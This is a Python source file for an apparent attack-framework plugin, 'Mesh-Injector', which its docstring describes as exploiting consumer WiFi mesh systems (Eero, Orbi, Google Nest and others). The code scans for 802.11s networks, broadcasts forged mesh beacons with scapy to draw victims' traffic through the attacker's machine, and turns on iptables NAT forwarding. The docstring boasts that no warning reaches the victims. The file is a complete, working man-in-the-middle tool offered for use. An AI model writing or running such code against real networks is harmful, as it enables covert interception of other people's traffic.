from core.plugin_manager import BasePlugin
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sniff, sendp
import asyncio
import subprocess
import threading
import time


# ── IEEE 802.11s Information Element builders ─────────────────────────────────

def _ie_mesh_id(mesh_id: str) -> bytes:
    return mesh_id.encode("utf-8", errors="replace")[:32]


def _ie_mesh_config() -> bytes:
    """
    IEEE 802.11-2020 §9.4.2.97 Mesh Configuration element (7 bytes).
    Path selection: HWMP (1), Metric: Airtime Link (1), no congestion
    control, no sync, no auth, mesh gate active, accepting new peers.
    """
    return bytes([
        0x01,   # Active Path Selection Protocol: HWMP
        0x01,   # Active Path Selection Metric: Airtime Link Metric
        0x00,   # Congestion Control: disabled
        0x00,   # Synchronisation: Neighbour Offset
        0x00,   # Authentication Protocol: open
        0x01,   # Mesh Formation Info: mesh gate, 1 peer
        0x09,   # Mesh Capability: accepting peers + forwarding
    ])


def _ie_supported_rates() -> bytes:
    return bytes([0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c])


def _build_mesh_beacon(src_mac: str, mesh_id: str, channel: int) -> "scapy.Packet":
    return (
        RadioTap()
        / Dot11(type=0, subtype=8,
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=src_mac,
                addr3=src_mac)
        / Dot11Beacon(cap=0x0421)  # ESS + ShortPreamble + ShortSlot
        / Dot11Elt(ID=0,   info=b"")                     # SSID: empty (mesh node)
        / Dot11Elt(ID=1,   info=_ie_supported_rates())   # Supported Rates
        / Dot11Elt(ID=3,   info=bytes([channel]))         # DS Parameter Set
        / Dot11Elt(ID=114, info=_ie_mesh_id(mesh_id))    # Mesh ID  (IE 114)
        / Dot11Elt(ID=113, info=_ie_mesh_config())       # Mesh Config (IE 113)
    )


class MeshInjectorPlugin(BasePlugin):
    """
    802.11s Mesh Node Injection.

    Exploits WiFi mesh networks (Eero, Orbi, Google Nest, TP-Link Deco,
    ASUS ZenWiFi, etc.) by injecting a rogue 802.11s mesh node that
    advertises a superior Airtime Link Metric.  Legitimate mesh nodes
    route traffic through the attacker in preference to the real gateway.

    Attack is completely transparent:
      - Victims receive uninterrupted real internet
      - No deauth, no captive portal, no client-side warning
      - Indistinguishable from a legitimate mesh node

    Phase 1 — Auto-detect: passive scan for 802.11s beacons (IE 113/114)
    Phase 2 — Inject: broadcast matching mesh beacons at ~10 Hz
    Phase 3 — Forward: NAT via iptables MASQUERADE on WAN interface

    IEEE 802.11-2020 §14 (Mesh Networking).
    Requires: monitor-capable wireless interface.
    """

    def __init__(self):
        self.running = False
        self.mesh_id = ""
        self.channel = 6
        self.iface = "wlan0"
        self.iface_wan = "eth0"
        self._beacon_thread: threading.Thread | None = None
        self.discovered_meshes: list[dict] = []

    @property
    def name(self) -> str:
        return "Mesh-Injector"

    @property
    def description(self) -> str:
        return "802.11s mesh node injection — transparent hop in victim WiFi mesh fabric"

    async def start(
        self,
        mesh_id: str = "",
        channel: int = 6,
        iface: str = "wlan0",
        iface_wan: str = "eth0",
        scan_first: bool = True,
    ):
        if self.running:
            return
        self.iface = iface
        self.iface_wan = iface_wan
        self.channel = channel
        self.running = True

        if scan_first or not mesh_id:
            self.log_event("Scanning for 802.11s mesh networks...", "SCAN")
            self.discovered_meshes = await asyncio.to_thread(self._passive_scan, 12)
            if self.discovered_meshes:
                best = self.discovered_meshes[0]
                self.mesh_id = mesh_id or best["mesh_id"]
                self.channel  = best.get("channel") or channel
                self.log_event(f"Targeting mesh '{self.mesh_id}' ch{self.channel}", "DETECT")
            else:
                self.mesh_id = mesh_id or "mesh"
                self.log_event("No mesh detected — broadcasting generic 802.11s node", "WARN")
        else:
            self.mesh_id = mesh_id

        await asyncio.to_thread(_set_channel, self.iface, self.channel)
        await asyncio.to_thread(self._setup_nat)

        self._beacon_thread = threading.Thread(target=self._beacon_loop, daemon=True)
        self._beacon_thread.start()

        self.log_event(
            f"Mesh node injected: mesh_id='{self.mesh_id}' ch{self.channel} iface={iface}",
            "START",
        )

    async def stop(self):
        self.running = False
        await asyncio.to_thread(self._teardown_nat)
        self.log_event("Mesh injection stopped. NAT cleared.", "STOP")

    # ── passive scan ──────────────────────────────────────────────────────────

    def _passive_scan(self, timeout: int) -> list[dict]:
        found: dict[tuple, dict] = {}

        def _pkt(pkt):
            if not pkt.haslayer(Dot11Beacon):
                return
            mesh_id_val = None
            has_mesh_cfg = False
            channel = None
            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 114 and elt.info is not None:   # Mesh ID
                    mesh_id_val = elt.info.decode(errors="replace")
                if elt.ID == 113:                             # Mesh Config
                    has_mesh_cfg = True
                if elt.ID == 3 and elt.info:                  # DS Param
                    channel = elt.info[0]
                elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None

            if has_mesh_cfg and mesh_id_val is not None:
                bssid = pkt[Dot11].addr3 or pkt[Dot11].addr2
                key = (bssid, mesh_id_val)
                if key not in found:
                    entry = {"bssid": bssid, "mesh_id": mesh_id_val, "channel": channel}
                    found[key] = entry
                    self.log_event(f"Found mesh: '{mesh_id_val}' {bssid} ch{channel}", "DETECT")

        sniff(
            iface=self.iface, prn=_pkt, timeout=timeout,
            stop_filter=lambda _: not self.running,
        )
        return list(found.values())

    # ── beacon injection ──────────────────────────────────────────────────────

    def _beacon_loop(self):
        src_mac = _read_mac(self.iface)
        while self.running:
            pkt = _build_mesh_beacon(src_mac, self.mesh_id, self.channel)
            try:
                sendp(pkt, iface=self.iface, verbose=False)
            except Exception as e:
                self.log_event(f"Beacon TX error: {e}", "ERROR")
                break
            time.sleep(0.102)   # ~10 beacons/sec — standard 802.11 interval

    # ── NAT / forwarding ──────────────────────────────────────────────────────

    def _setup_nat(self):
        _sh(["sysctl", "-w", "net.ipv4.ip_forward=1"])
        _sh(["iptables", "-t", "nat", "-A", "POSTROUTING",
             "-o", self.iface_wan, "-j", "MASQUERADE"])
        _sh(["iptables", "-A", "FORWARD", "-i", self.iface,
             "-o", self.iface_wan, "-j", "ACCEPT"])
        _sh(["iptables", "-A", "FORWARD", "-i", self.iface_wan,
             "-o", self.iface, "-m", "state",
             "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])

    def _teardown_nat(self):
        _sh(["iptables", "-t", "nat", "-F"])
        _sh(["iptables", "-F", "FORWARD"])
        _sh(["sysctl", "-w", "net.ipv4.ip_forward=0"])

    async def get_status(self) -> dict:
        return {
            "running": self.running,
            "mesh_id": self.mesh_id,
            "channel": self.channel,
            "iface": self.iface,
            "discovered_meshes": self.discovered_meshes,
        }


# ── utilities ─────────────────────────────────────────────────────────────────

def _read_mac(iface: str) -> str:
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip()
    except OSError:
        return "de:ad:be:ef:00:01"


def _set_channel(iface: str, channel: int):
    try:
        subprocess.run(["iwconfig", iface, "channel", str(channel)],
                       capture_output=True, check=False)
    except FileNotFoundError:
        pass


def _sh(cmd: list[str]):
    try:
        subprocess.run(cmd, check=False, capture_output=True)
    except FileNotFoundError:
        pass
